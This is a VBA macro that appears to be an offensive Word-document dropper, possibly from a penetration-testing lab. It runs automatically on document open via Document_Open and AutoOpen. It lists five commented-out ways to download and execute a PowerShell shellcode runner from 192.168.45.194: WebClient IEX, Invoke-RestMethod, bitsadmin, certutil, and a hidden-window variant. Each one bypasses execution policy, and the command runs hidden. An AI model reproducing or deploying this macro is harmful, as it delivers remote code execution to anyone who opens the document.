Sub RunC()
    Dim str As String
    ' Choose the desired download method by uncommenting its corresponding line and commenting out the others.

    ' Method 1: Using .NET’s WebClient (DownloadString)
    ' str = "cmd.exe /c %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command ""$wc = New-Object System.Net.WebClient; IEX $wc.DownloadString('http://192.168.45.194/Payloads/AES_Shellcode_Runner_Delegate.ps1')"""

    ' Method 2: Using PowerShell’s Invoke-RestMethod to download and execute the script
    ' str = "cmd.exe /c %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command ""IEX (Invoke-RestMethod 'http://192.168.45.194/Payloads/AES_Shellcode_Runner_Delegate.ps1')"""

    ' Method 3: Using Bitsadmin to download the file to %TEMP% then executing it with PowerShell
    ' str = "cmd.exe /c bitsadmin /transfer myjob /download /priority normal http://192.168.45.194/Payloads/AES_Shellcode_Runner_Delegate.ps1 %TEMP%\payload.ps1 && %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File %TEMP%\payload.ps1"

    ' Method 4: Leveraging certutil to download the payload to %TEMP% and then reading it via Get-Content
    ' str = "cmd.exe /c certutil -urlcache -split -f http://192.168.45.194/Payloads/AES_Shellcode_Runner_Delegate.ps1 %TEMP%\payload.ps1 && %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command ""IEX (Get-Content %TEMP%\payload.ps1 -Raw)"""

    ' Method 5: Running PowerShell in a hidden window (-WindowStyle Hidden) to reduce visual indicators
    ' str = "cmd.exe /c %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX ((Invoke-RestMethod 'http://192.168.45.194/Payloads/AES_Shellcode_Runner_Delegate.ps1'))"""

    Shell str, vbHide
End Sub

Sub Document_Open()
    RunC
End Sub

Sub AutoOpen()
    RunC
End Sub
